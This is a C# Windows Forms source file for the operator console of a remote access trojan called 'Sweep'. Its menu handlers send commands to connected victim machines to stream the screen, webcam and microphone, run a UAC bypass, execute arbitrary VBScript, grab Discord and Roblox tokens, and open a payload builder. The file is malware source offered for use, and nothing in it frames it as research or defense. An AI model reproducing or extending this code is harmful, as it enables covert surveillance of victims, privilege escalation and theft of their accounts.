using System;
using System.Collections.Generic;
using System.Windows.Forms;
using BrightIdeasSoftware;
using LazyServer;
using Newtonsoft.Json.Linq;
using Sweep.Models;
using Sweep.Services;    // MessageHandler
using Sweep.UI;          // ListViewConfigurator
using Microsoft.VisualBasic;
using System.Threading.Tasks;
using System.Security.Cryptography;

namespace Sweep.Forms
{
    public partial class Sweep : Form
    {
        private readonly LazyServerHost _server;
        private readonly MessageHandler _dispatcher;
        private int logsnum = 0;

        // Inject the already-started server here
        public Sweep(LazyServerHost server)
        {
            InitializeComponent();

            if (server == null)
                throw new ArgumentNullException(nameof(server));

            _server = server;

            // 1) Configure the ObjectListView once
            ListViewConfigurator.Configure(listView1, Global.Port);

            // 2) Create your central dispatcher
            //    It will subscribe to server events and call your handlers
            _dispatcher = new MessageHandler(_server, listView1, Global.Port, logsview, this);
            logsview.FormatRow += (sender, e) =>
            {
                var log = (Log)e.Model;

                if (log.Type == "Error")
                {
                    e.Item.ForeColor = System.Drawing.Color.Red;
                }
            };
            logsview.SetObjects(new List<Log>());
            logsview.ItemsChanged += (sender, e) => {
                logsnum++;
                counter.Text = logsnum.ToString();
                counter.Visible = logsnum > 0;
            };
            usname.Text = usname.Text.Replace("%s", Global.Name);
        }

        private async void seescreen_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects) {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject {
                        ["command"] = "ssloop",
                        ["quality"] = "40%"
                    }.ToString());
                }
            }
        }

        private void Sweep_Load(object sender, EventArgs e)
        {
            portnum.Text = portnum.Text.Replace("%s", Global.Port.ToString());
        }

        private async void uACBypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "uacbypass",
                    }.ToString());
                }
            }
        }

        private void home_Click(object sender, EventArgs e)
        {
            listView1.Visible = true;
            logsview.Visible = false;
        }

        private void logs_Click(object sender, EventArgs e)
        {
            listView1.Visible = false;
            logsview.Visible = true;
            logsnum = 0;
            counter.Visible = false;
        }

        private async void webcam_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "camloop",
                        ["quality"] = "40%",

                    }.ToString());
                }
            }
        }

        private async void microphoneToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "micloop",

                    }.ToString());
                }
            }
        }

        private async void chatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var input = Interaction.InputBox("Enter display name", "Chat", Global.Name);

                    if (String.IsNullOrEmpty(input)) {
                        return;
                    }

                    await _server.SendMessageToConnection(conn, new JObject
                    {
                        ["command"] = "chat",
                        ["username"] = input,
                    }.ToString());
                }
            }
        }

        private async void runVBScriptToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new VBScriptExecute();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.Show();
                }
            }
        }

        private void discordTokenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new TokenGrabber();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.Show();
                }
            }
        }

        private void robloxGraToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var obj in listView1.SelectedObjects)
            {
                ClientInfo item = (ClientInfo)obj;
                if (item == null) { return; };

                ClientConnection conn = _server.GetConnectionById(item.ID);
                if (conn != null)
                {
                    var f = new TokenGrabber();
                    f.serverHost = _server;
                    f.connid = item.ID;
                    f.mode = "roblox";
                    f.Show();
                }
            }
        }

        private async void builder_Click(object sender, EventArgs e)
        {
            var f = new Builder();
            f.Opacity = 0;
            f.Show();
            await Program.FadeIn(f, 35);
        }

        /*protected override void OnDeactivate(EventArgs e)
        {
            timer1.Start();
            
            base.OnDeactivate(e);
        }

        protected override void OnActivated(EventArgs e)
        {
            timer1.Stop();
            opacity = 1;
            
            this.Opacity = 1;
            base.OnActivated(e);
        }
        private static double opacity = 0.95;
        private void timer1_Tick(object sender, EventArgs e)
        {
            timer1.Interval = new Random().Next(1000, 10000);
            opacity -= 0.05;
            if (opacity < 0.8) {
                opacity = 0.8;
            }
            this.Opacity = opacity;
        }*/
    }

}
